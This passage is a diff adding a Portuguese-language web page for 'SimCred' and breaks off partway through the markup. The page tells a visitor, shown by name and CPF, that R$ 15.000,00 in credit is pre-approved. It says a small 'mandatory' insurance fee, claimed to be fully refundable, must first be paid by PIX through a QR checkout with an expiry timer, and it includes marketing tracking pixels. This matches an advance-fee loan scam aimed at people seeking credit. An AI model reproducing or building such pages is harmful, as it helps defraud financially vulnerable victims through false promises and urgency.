@@ -1,0 +1,1219 @@
+<!DOCTYPE html><html lang="pt-BR"><head><script src="/jquery-4.0.0.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+  <script src="/js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+    <script>
+  window.pixelId = "69122e1651618c82cbe95013";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+  <script>!function(i,n){i._plt=i._plt||(n&&n.timeOrigin?n.timeOrigin+n.now():Date.now())}(window,performance);</script>
+  <link rel="preload" href="https://scripts.converteai.net/9e4b9a4f-a7f5-484d-b96c-67820b842528/players/698137edc7e321680dab3881/v4/player.js" as="script">
+  <link rel="preload" href="https://scripts.converteai.net/lib/js/smartplayer-wc/v4/smartplayer.js" as="script">
+  <link rel="preload" href="https://cdn.converteai.net/9e4b9a4f-a7f5-484d-b96c-67820b842528/698137e9dc9de813f8975e20/main.m3u8" as="fetch">
+  <link rel="dns-prefetch" href="https://cdn.converteai.net">
+  <link rel="dns-prefetch" href="https://scripts.converteai.net">
+  <link rel="dns-prefetch" href="https://images.converteai.net">
+  <link rel="dns-prefetch" href="https://api.vturb.com.br">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Última Etapa — Liberação Imediata | SimCred</title>
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700&family=Plus+Jakarta+Sans:wght@500;600;700;800&family=Outfit:wght@400;500;600;700;800&family=Sora:wght@700;800&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --green-accent: #22C55E;
+      --green-accent-dark: #16A34A;
+      --green-accent-light: #DCFCE7;
+      --green-primary: #FAFBFC;
+      --green-dark: #E5E7EB;
+      --green-darker: #374151;
+      --bg: #F4F5F7;
+      --card: #fff;
+      --text: #1f2937;
+      --text-light: #6b7280;
+      --success: #22C55E;
+      --success-bg: #DCFCE7;
+      --warning: #f59e0b;
+      --warning-bg: #fffbeb;
+      --radius: 16px;
+      --shadow-lg: 0 8px 32px rgba(26, 58, 58, 0.12);
+      font-family: 'DM Sans', sans-serif;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      -webkit-font-smoothing: antialiased;
+      min-height: 100vh;
+      padding-top: 72px;
+    }
+
+    header.header {
+      background: #042444;
+      padding: 14px 0;
+      position: fixed;
+      top: 0;
+      width: 100%;
+      z-index: 1000;
+      box-shadow: 0 2px 12px rgba(4,36,68,0.3);
+    }
+    
+    .header-content {
+      padding: 0 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      max-width: 550px;
+      margin: 0 auto;
+    }
+    
+    .header-left {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+    
+    .menu-icon {
+      width: 40px; height: 40px; background: rgba(255,255,255,0.1);
+      border-radius: 12px; display: flex; align-items: center; justify-content: center;
+      cursor: pointer; border: 1px solid rgba(255,255,255,0.15); transition: all 0.2s ease;
+    }
+    .menu-icon:hover { background: rgba(255,255,255,0.18); transform: scale(1.05); }
+    .menu-icon svg { width: 18px; height: 18px; color: rgba(255,255,255,0.85); stroke-width: 2.5; }
+    .logo { display:flex; align-items:center; user-select:none; }
+    .logo-cred { font-family:'Sora','Plus Jakarta Sans',sans-serif; font-weight:800; font-size:20px; color:#ffffff; letter-spacing:-0.5px; line-height:1; }
+    .logo-diamond { width:7px; height:7px; background:#22C55E; transform:rotate(45deg); margin:0 8px; border-radius:1.5px; flex-shrink:0; }
+    .logo-on { font-family:'Sora','Plus Jakarta Sans',sans-serif; font-weight:800; font-size:20px; color:#22C55E; letter-spacing:-0.5px; line-height:1; }
+    .user-info { display: flex; flex-direction: column; align-items: flex-end; gap: 1px; }
+    .user-name { font-size: 13px; font-weight: 600; color: #ffffff; max-width: 120px; text-overflow: ellipsis; overflow: hidden; white-space: nowrap; }
+    .user-cpf { font-size: 11px; color: rgba(255,255,255,0.55); letter-spacing: 0.3px; }
+    .user-icon-wrapper {
+      width: 40px; height: 40px; background: rgba(34,197,94,0.2); border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      border: 2px solid #22C55E; color: #22C55E;
+    }
+    .user-icon-wrapper svg { width: 20px; height: 20px; color: #22C55E; }
+    .header-right { display: flex; align-items: center; gap: 10px; }
+
+    .main-container {
+      min-height: calc(100vh - 150px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 520px;
+      background: var(--card);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow-lg);
+      padding: 28px 24px;
+      border: 1px solid rgba(26, 58, 58, 0.08);
+    }
+
+    .status-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: var(--success-bg);
+      color: #111827;
+      padding: 6px 12px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 700;
+      margin-bottom: 16px;
+      text-transform: uppercase;
+      letter-spacing: 0.3px;
+    }
+    .status-badge svg { width: 14px; height: 14px; color: var(--green-accent); }
+
+    .page-title {
+      font-family: 'Outfit', sans-serif;
+      font-size: 1.4rem;
+      font-weight: 800;
+      color: #111827;
+      margin-bottom: 8px;
+      line-height: 1.3;
+      letter-spacing: -0.3px;
+    }
+    .highlight { color: var(--green-accent); }
+
+    .page-subtitle {
+      color: var(--text-light);
+      font-size: 0.95rem;
+      margin-bottom: 20px;
+      font-weight: 500;
+    }
+
+    .approved-card {
+      background: linear-gradient(135deg, #F0FDF4, #DCFCE7);
+      border: 1px solid rgba(34,197,94,0.15);
+      border-radius: 12px;
+      padding: 24px;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .approved-label {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-size: 0.85rem;
+      color: var(--green-accent-dark);
+      font-weight: 600;
+      margin-bottom: 8px;
+      text-transform: uppercase;
+      letter-spacing: 0.3px;
+    }
+    .approved-label svg { width: 18px; height: 18px; color: var(--green-accent); }
+
+    .approved-amount {
+      font-size: 2.2rem;
+      font-weight: 800;
+      color: var(--green-accent-dark);
+      margin-bottom: 6px;
+    }
+
+    .approved-installments {
+      font-size: 1rem;
+      font-weight: 600;
+      color: #374151;
+    }
+
+    .progress-section {
+      padding: 20px;
+      background: #fff;
+      border: 2px solid var(--green-accent);
+      border-radius: 12px;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    .progress-section.completed {
+      background: #fff;
+      border-color: var(--green-accent);
+    }
+
+    .progress-main-title {
+      font-size: 1.1rem;
+      font-weight: 800;
+      color: #111827;
+      margin-bottom: 4px;
+    }
+
+    .progress-subtitle {
+      font-size: 0.85rem;
+      color: var(--text-light);
+      margin-bottom: 16px;
+    }
+
+    .progress-bar-wrapper {
+      position: relative;
+      margin-bottom: 10px;
+      height: 16px;
+      display: flex;
+      align-items: center;
+    }
+
+    .progress-bar-container {
+      width: 100%;
+      height: 6px;
+      background: rgba(34, 197, 94, 0.25);
+      border-radius: 10px;
+      overflow: visible;
+      position: relative;
+    }
+
+    .progress-bar-fill {
+      height: 100%;
+      width: 0%;
+      background: var(--green-accent);
+      border-radius: 10px;
+      transition: width 0.3s ease;
+      position: relative;
+    }
+
+    .progress-bar-fill::after {
+      content: '';
+      position: absolute;
+      right: -8px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 16px;
+      height: 16px;
+      background: var(--green-accent);
+      border-radius: 50%;
+      box-shadow: 0 2px 6px rgba(34, 197, 94, 0.4);
+    }
+
+    .progress-footer {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .progress-status {
+      font-size: 0.8rem;
+      color: var(--text-light);
+      font-weight: 500;
+    }
+
+    .progress-percent {
+      font-size: 0.8rem;
+      font-weight: 700;
+      color: var(--green-accent);
+    }
+
+    .cta-button.hidden {
+      display: none;
+    }
+
+    .insurance-section {
+      background: #f8fafc;
+      border: 1px solid #e2e8f0;
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 20px;
+    }
+
+    .insurance-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 14px;
+    }
+
+    .insurance-icon-box {
+      width: 44px; height: 44px; min-width: 44px;
+      background: var(--green-accent);
+      border-radius: 12px;
+      display: flex; align-items: center; justify-content: center;
+    }
+    .insurance-icon-box svg { width: 24px; height: 24px; color: white; }
+
+    .insurance-title { font-size: 1rem; font-weight: 700; color: #111827; }
+    .insurance-subtitle { font-size: 0.8rem; color: var(--text-light); font-weight: 500; }
+
+    .insurance-features { list-style: none; padding: 0; margin: 0; }
+    .insurance-features li {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 8px 0;
+      font-size: 0.85rem;
+      color: var(--text);
+      font-weight: 500;
+      border-bottom: 1px solid #e5e7eb;
+    }
+    .insurance-features li:last-child { border-bottom: none; }
+
+    .feature-check {
+      width: 22px; height: 22px; min-width: 22px;
+      background: var(--green-accent);
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+    }
+    .feature-check svg { width: 12px; height: 12px; color: white; }
+
+    .pricing-card {
+      background: white;
+      border: 1.5px solid #E5E7EB;
+      border-radius: 12px;
+      padding: 18px;
+      margin-bottom: 20px;
+    }
+
+    .pricing-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 10px 0;
+      border-bottom: 1px solid #f3f4f6;
+      font-size: 0.9rem;
+    }
+    .pricing-row:last-child {
+      border-bottom: none;
+      padding-top: 14px;
+      margin-top: 6px;
+      border-top: 2px solid var(--green-accent);
+    }
+    .pricing-label { color: var(--text-light); font-weight: 500; }
+    .pricing-value { font-weight: 600; color: var(--text); }
+    .pricing-row.total .pricing-label,
+    .pricing-row.total .pricing-value {
+      font-size: 1.1rem;
+      font-weight: 800;
+      color: #111827;
+    }
+
+    .cta-button {
+      width: 100%;
+      background: var(--green-accent);
+      color: white;
+      border: none;
+      padding: 18px 24px;
+      border-radius: 12px;
+      font-size: 1.05rem;
+      font-weight: 700;
+      cursor: pointer;
+      font-family: 'DM Sans', sans-serif;
+      display: flex;
+      flex-direction: row;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      box-shadow: 0 8px 24px rgba(34, 197, 94, 0.3);
+      transition: all 0.3s ease;
+      margin-bottom: 16px;
+      text-align: center;
+      line-height: 1.3;
+    }
+    .cta-button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 12px 32px rgba(34, 197, 94, 0.4);
+      background: var(--green-accent-dark);
+    }
+    .cta-button:active { transform: translateY(0); }
+    .cta-button svg { 
+      width: 24px; 
+      height: 24px; 
+      min-width: 24px;
+      min-height: 24px;
+      flex-shrink: 0;
+    }
+    .cta-button .spinner {
+      width: 24px; 
+      height: 24px;
+      min-width: 24px;
+      border: 3px solid rgba(255, 255, 255, 0.3);
+      border-top: 3px solid white;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      flex-shrink: 0;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .trust-bar {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      padding: 12px;
+      background: var(--green-accent-light);
+      border-radius: 8px;
+      margin-bottom: 16px;
+    }
+    .trust-bar svg { width: 16px; height: 16px; color: var(--green-accent); }
+    .trust-bar span { font-size: 0.8rem; color: #111827; font-weight: 600; }
+
+    .info-text {
+      text-align: center;
+      font-size: 0.8rem;
+      color: var(--text-light);
+      line-height: 1.6;
+    }
+
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.6);
+      z-index: 2000;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      backdrop-filter: blur(4px);
+    }
+    .modal-overlay.show { display: flex; }
+
+    .modal-content {
+      background: white;
+      border-radius: 16px;
+      padding: 28px 24px;
+      max-width: 380px;
+      width: 100%;
+      text-align: center;
+      animation: modalPop 0.3s ease;
+    }
+    @keyframes modalPop {
+      from { opacity: 0; transform: scale(0.9); }
+      to { opacity: 1; transform: scale(1); }
+    }
+
+    .modal-icon {
+      width: 60px; height: 60px;
+      background: var(--green-accent-light);
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 16px;
+    }
+    .modal-icon svg { width: 30px; height: 30px; color: var(--green-accent); }
+
+    .modal-title { font-size: 1.2rem; font-weight: 700; color: #111827; margin-bottom: 12px; }
+    .modal-message { font-size: 0.9rem; color: var(--text-light); line-height: 1.6; margin-bottom: 20px; }
+    .modal-highlight { color: var(--green-accent); font-weight: 700; }
+
+    .modal-button {
+      width: 100%;
+      background: var(--green-accent);
+      color: white;
+      border: none;
+      padding: 14px 20px;
+      border-radius: 10px;
+      font-size: 0.95rem;
+      font-weight: 700;
+      cursor: pointer;
+      font-family: 'DM Sans', sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      box-shadow: 0 4px 15px rgba(34, 197, 94, 0.3);
+      transition: all 0.3s ease;
+    }
+    .modal-button:hover {
+      background: var(--green-accent-dark);
+    }
+    .modal-button svg { width: 18px; height: 18px; }
+
+    footer.site-footer {
+      margin-top: auto;
+      background: #042444;
+      color: rgba(255,255,255,0.5);
+      padding: 24px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      border-top: 1px solid rgba(255,255,255,0.08);
+    }
+    .footer-inner {
+      max-width: 550px;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+    }
+    .footer-logo { display:flex; align-items:center; user-select:none; }
+    .footer-logo .fl-cred { font-family:'Sora','Plus Jakarta Sans',sans-serif; font-weight:800; font-size:15px; color:rgba(255,255,255,0.7); letter-spacing:-0.5px; }
+    .footer-logo .fl-diamond { width:5px; height:5px; background:rgba(255,255,255,0.5); transform:rotate(45deg); margin:0 6px; border-radius:1px; display:inline-block; vertical-align:middle; }
+    .footer-logo .fl-on { font-family:'Sora','Plus Jakarta Sans',sans-serif; font-weight:800; font-size:15px; color:#22C55E; letter-spacing:-0.5px; }
+    footer small { font-size: 11px; opacity: 0.7; line-height: 1.5; color: rgba(255,255,255,0.5); }
+    footer small strong { color: var(--green-accent); font-weight: 600; }
+
+    /* VSL Video Player - Vturb */
+    .vsl-container {
+      margin-bottom: 20px;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+    }
+
+    .vsl-container vturb-smartplayer {
+      display: block !important;
+      width: 100% !important;
+      max-width: 100% !important;
+    }
+
+    .vsl-container iframe {
+      border-radius: 12px;
+    }
+
+    @media (max-width: 600px) {
+      .container { padding: 24px 20px; }
+      .page-title { font-size: 1.25rem; }
+      .approved-amount { font-size: 1.9rem; }
+      .cta-button { 
+        padding: 16px 20px; 
+        font-size: 0.95rem;
+        gap: 10px;
+      }
+      .cta-button svg {
+        width: 22px;
+        height: 22px;
+        min-width: 22px;
+        min-height: 22px;
+      }
+    }
+      .logo-wrap { display:flex; flex-direction:column; align-items:center; user-select:none; text-decoration:none; }
+    .logo-row { display:flex; align-items:center; }
+    .logo-tagline { font-family:'DM Sans','Poppins',sans-serif; font-weight:600; font-size:7px; letter-spacing:2.5px; text-transform:uppercase; color:rgba(255,255,255,0.4); margin-top:1px; }
+    .footer-tagline { font-family:'DM Sans','Poppins',sans-serif; font-weight:600; font-size:6px; letter-spacing:2px; text-transform:uppercase; color:rgba(255,255,255,0.35); margin-top:1px; }
+
+    /* ═══════ PIX CHECKOUT MODAL ═══════ */
+    .pix-overlay {
+      display:none; position:fixed; inset:0; z-index:3000;
+      background:rgba(4,36,68,.7); backdrop-filter:blur(6px);
+      align-items:center; justify-content:center; padding:20px;
+    }
+    .pix-overlay.show { display:flex; }
+    .pix-modal {
+      background:#fff; border-radius:20px; width:100%; max-width:420px;
+      box-shadow:0 20px 60px rgba(4,36,68,.3); overflow:hidden;
+      animation:pixPop .35s cubic-bezier(.23,1,.32,1);
+      position:relative;
+    }
+    @keyframes pixPop { from{opacity:0;transform:scale(.92) translateY(20px);} to{opacity:1;transform:scale(1) translateY(0);} }
+    .pix-close {
+      position:absolute; top:14px; right:14px; width:32px; height:32px;
+      background:rgba(4,36,68,.08); border-radius:50%; display:flex;
+      align-items:center; justify-content:center; cursor:pointer;
+      font-size:18px; color:#6B7280; z-index:2; border:none;
+      transition:all .15s;
+    }
+    .pix-close:hover { background:rgba(4,36,68,.15); color:#042444; }
+    .pix-top {
+      background:linear-gradient(135deg,#042444,#0a3a6e);
+      padding:24px 24px 20px; text-align:center; position:relative;
+    }
+    .pix-top::after { content:''; position:absolute; bottom:0; left:0; right:0; height:3px; background:linear-gradient(90deg,#22C55E,#16A34A); }
+    .pix-top h3 { font-family:'Outfit',sans-serif; font-size:18px; font-weight:700; color:#fff; margin:0 0 4px; }
+    .pix-top p { font-size:13px; color:rgba(255,255,255,.7); margin:0; }
+    .pix-top .pix-icon { display:flex; align-items:center; justify-content:center; gap:8px; margin-bottom:10px; }
+    .pix-top .pix-icon svg { width:28px; height:28px; color:#22C55E; }
+    .pix-body { padding:24px; }
+    .pix-qr-wrap {
+      display:flex; align-items:center; justify-content:center;
+      padding:16px; background:#f8fafc; border:2px dashed #E5E7EB;
+      border-radius:16px; margin-bottom:18px;
+    }
+    .pix-qr-wrap canvas, .pix-qr-wrap img { border-radius:8px !important; }
+    .pix-code-label { font-size:12px; font-weight:600; color:#6B7280; text-transform:uppercase; letter-spacing:.5px; margin-bottom:8px; }
+    .pix-code-box {
+      display:flex; gap:8px; margin-bottom:18px;
+    }
+    .pix-code-box input {
+      flex:1; padding:12px 14px; border:2px solid #E5E7EB; border-radius:10px;
+      font-size:12px; font-family:'DM Sans',sans-serif; color:#374151;
+      background:#f9fafb; outline:none; min-width:0;
+    }
+    .pix-code-box input:focus { border-color:#22C55E; }
+    .pix-copy-btn {
+      padding:12px 20px; background:linear-gradient(135deg,#22C55E,#16A34A);
+      color:#fff; border:none; border-radius:10px; font-size:13px;
+      font-weight:700; cursor:pointer; font-family:'DM Sans',sans-serif;
+      white-space:nowrap; transition:all .15s;
+      box-shadow:0 3px 12px rgba(34,197,94,.3);
+    }
+    .pix-copy-btn:hover { transform:translateY(-1px); box-shadow:0 5px 16px rgba(34,197,94,.4); }
+    .pix-copy-btn.copied { background:#042444; }
+    .pix-timer {
+      display:flex; align-items:center; justify-content:center; gap:6px;
+      padding:10px; background:#FFFBEB; border:1.5px solid #FDE68A;
+      border-radius:10px; margin-bottom:16px;
+    }
+    .pix-timer svg { width:16px; height:16px; color:#F59E0B; flex-shrink:0; }
+    .pix-timer span { font-size:13px; color:#92400E; font-weight:500; }
+    .pix-timer strong { font-family:'Outfit',sans-serif; font-weight:700; }
+    .pix-waiting {
+      display:flex; align-items:center; justify-content:center; gap:10px;
+      padding:14px; background:#f0fdf4; border:1.5px solid rgba(34,197,94,.2);
+      border-radius:10px;
+    }
+    .pix-pulse {
+      width:10px; height:10px; background:#22C55E; border-radius:50%;
+      animation:pulse 1.5s ease-in-out infinite;
+    }
+    @keyframes pulse { 0%,100%{opacity:1;transform:scale(1);} 50%{opacity:.5;transform:scale(.8);} }
+    .pix-waiting span { font-size:13px; color:#16A34A; font-weight:600; }
+    .pix-amount-badge {
+      display:inline-flex; align-items:center; gap:6px;
+      background:rgba(34,197,94,.15); color:#16A34A;
+      padding:6px 14px; border-radius:20px; font-size:13px; font-weight:700;
+      margin-top:8px;
+    }
+    /* Success state */
+    .pix-success {
+      display:none; flex-direction:column; align-items:center;
+      padding:40px 24px; text-align:center;
+    }
+    .pix-success-icon {
+      width:72px; height:72px; background:#DCFCE7; border-radius:50%;
+      display:flex; align-items:center; justify-content:center;
+      margin-bottom:16px; animation:successPop .5s cubic-bezier(.23,1,.32,1);
+    }
+    @keyframes successPop { from{transform:scale(0);} to{transform:scale(1);} }
+    .pix-success-icon svg { width:36px; height:36px; color:#16A34A; }
+    .pix-success h3 { font-family:'Outfit',sans-serif; font-size:20px; font-weight:800; color:#042444; margin-bottom:8px; }
+    .pix-success p { font-size:14px; color:#6B7280; line-height:1.6; max-width:300px; }
+    /* Expired state */
+    .pix-expired {
+      display:none; flex-direction:column; align-items:center;
+      padding:40px 24px; text-align:center;
+    }
+    .pix-expired-icon {
+      width:72px; height:72px; background:#FEF3C7; border-radius:50%;
+      display:flex; align-items:center; justify-content:center;
+      margin-bottom:16px;
+    }
+    .pix-expired-icon svg { width:36px; height:36px; color:#F59E0B; }
+    .pix-expired h3 { font-family:'Outfit',sans-serif; font-size:20px; font-weight:800; color:#042444; margin-bottom:8px; }
+    .pix-expired p { font-size:14px; color:#6B7280; margin-bottom:20px; }
+    .pix-retry-btn {
+      padding:14px 28px; background:linear-gradient(135deg,#22C55E,#16A34A);
+      color:#fff; border:none; border-radius:12px; font-size:15px;
+      font-weight:700; cursor:pointer; font-family:'DM Sans',sans-serif;
+      box-shadow:0 4px 16px rgba(34,197,94,.35); transition:all .15s;
+    }
+    .pix-retry-btn:hover { transform:translateY(-2px); box-shadow:0 6px 20px rgba(34,197,94,.45); }
+  </style>
+</head>
+<body>
+  <header class="header">
+    <div class="header-content">
+      <div class="header-left">
+        <div class="menu-icon">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
+          </svg>
+        </div>
+        <a href="index.html" class="logo-wrap"><img src="/images/Sim-Cred.png" alt="SimCred" style="height:38px;width:auto;object-fit:contain;display:block;"></a>
+      </div>
+      <div class="header-right">
+        <div class="user-info">
+          <span class="user-name" id="userName">Usuário</span>
+          <span class="user-cpf" id="userCpf">***.***.***-**</span>
+        </div>
+        <div class="user-icon-wrapper">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
+          </svg>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <div class="main-container">
+    <div class="container">
+      <div class="status-badge">
+        <svg fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+        </svg>
+        Crédito Pré-Aprovado
+      </div>
+
+      <h1 class="page-title">
+        Finalize a contratação do <span class="highlight">Seguro Prestamista</span>
+      </h1>
+      <p class="page-subtitle">Última etapa para liberação do seu crédito via PIX</p>
+
+      <div class="approved-card">
+        <div class="approved-label">
+          <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+          </svg>
+          Valor Aprovado
+        </div>
+        <div class="approved-amount" id="approvedAmount">R$ 15.000,00</div>
+        <div class="approved-installments" id="installmentsText">24x de R$ 750,00</div>
+      </div>
+
+      <!-- VSL Video - Vturb Player (NOVA VSL)
+      <div class="vsl-container" id="vslContainer">
+        <vturb-smartplayer id="vid-698137edc7e321680dab3881" style="display: block; margin: 0 auto; width: 100%; max-width: 100%;"></vturb-smartplayer>
+        <script type="text/javascript">
+          var s=document.createElement("script");
+          s.src="https://scripts.converteai.net/9e4b9a4f-a7f5-484d-b96c-67820b842528/players/698137edc7e321680dab3881/v4/player.js", s.async=!0,document.head.appendChild(s);
+        </script>
+      </div> -->
+
+
+
+      <div class="insurance-section">
+        <div class="insurance-header">
+          <div class="insurance-icon-box">
+            <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
+            </svg>
+          </div>
+          <div>
+            <div class="insurance-title">Seguro Prestamista</div>
+            <div class="insurance-subtitle">Obrigatório para liberação do crédito</div>
+          </div>
+        </div>
+
+        <ul class="insurance-features">
+          <li>
+            <span class="feature-check">
+              <svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
+              </svg>
+            </span>
+            Proteção contra morte e invalidez
+          </li>
+          <li>
+            <span class="feature-check">
+              <svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
+              </svg>
+            </span>
+            100% reembolsável ao final do contrato
+          </li>
+          <li>
+            <span class="feature-check">
+              <svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
+              </svg>
+            </span>
+            Pagamento único (taxa única)
+          </li>
+          <li>
+            <span class="feature-check">
+              <svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
+              </svg>
+            </span>
+            Liberação imediata após confirmação
+          </li>
+        </ul>
+      </div>
+
+      <div class="pricing-card">
+        <div class="pricing-row">
+          <span class="pricing-label">Cobertura básica</span>
+          <span class="pricing-value">R$ 11,61</span>
+        </div>
+        <div class="pricing-row">
+          <span class="pricing-label">Garantia seguradora</span>
+          <span class="pricing-value">R$ 13,83</span>
+        </div>
+        <div class="pricing-row">
+          <span class="pricing-label">Certificado digital</span>
+          <span class="pricing-value">R$ 4,43</span>
+        </div>
+        <div class="pricing-row total">
+          <span class="pricing-label">Valor Total</span>
+          <span class="pricing-value">R$ 29,87</span>
+        </div>
+      </div>
+
+      <button class="cta-button" id="ctaButton" onclick="handleCTA()">
+        <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
+        </svg>
+        <span>Contratar Seguro e Liberar Crédito</span>
+      </button>
+
+      <div class="trust-bar">
+        <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
+        </svg>
+        <span>Ambiente seguro e criptografado</span>
+      </div>
+
+      <p class="info-text">
+        Após a confirmação do pagamento, o valor será liberado automaticamente via PIX em até 10 minutos.
+      </p>
+    </div>
+  </div>
+
+  <!-- PIX CHECKOUT MODAL -->
+  <div class="pix-overlay" id="pixOverlay">
+    <div class="pix-modal">
+      <button class="pix-close" onclick="closePixModal()">×</button>
+
+      <!-- Top bar -->
+      <div class="pix-top">
+        <div class="pix-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M12 4v1m6 11h2m-6 0h-2v4m0-11v3m0 0h.01M12 12h4.01M16 20h4M4 12h4m12 0h.01M5 8h2a1 1 0 001-1V5a1 1 0 00-1-1H5a1 1 0 00-1 1v2a1 1 0 001 1zm12 0h2a1 1 0 001-1V5a1 1 0 00-1-1h-2a1 1 0 00-1 1v2a1 1 0 001 1zM5 20h2a1 1 0 001-1v-2a1 1 0 00-1-1H5a1 1 0 00-1 1v2a1 1 0 001 1z"></path></svg>
+        </div>
+        <h3>Pagamento via PIX</h3>
+        <p>Escaneie o QR Code ou copie o código abaixo</p>
+        <div class="pix-amount-badge" id="pixAmountBadge">R$ 29,87</div>
+      </div>
+
+      <!-- Pending State -->
+      <div class="pix-body" id="pixPending">
+        <div class="pix-qr-wrap">
+          <div id="pixQrCode"></div>
+        </div>
+        <div class="pix-code-label">Código PIX (copia e cola)</div>
+        <div class="pix-code-box">
+          <input type="text" id="pixCodeText" readonly>
+          <button class="pix-copy-btn" id="pixCopyBtn" onclick="copyPixCode()">Copiar</button>
+        </div>
+        <div class="pix-timer">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+          <span>Expira em <strong id="pixTimer">59:59</strong></span>
+        </div>
+        <div class="pix-waiting">
+          <div class="pix-pulse"></div>
+          <span>Aguardando pagamento...</span>
+        </div>
+      </div>
+
+      <!-- Success State -->
+      <div class="pix-success" id="pixSuccess">
+        <div class="pix-success-icon">
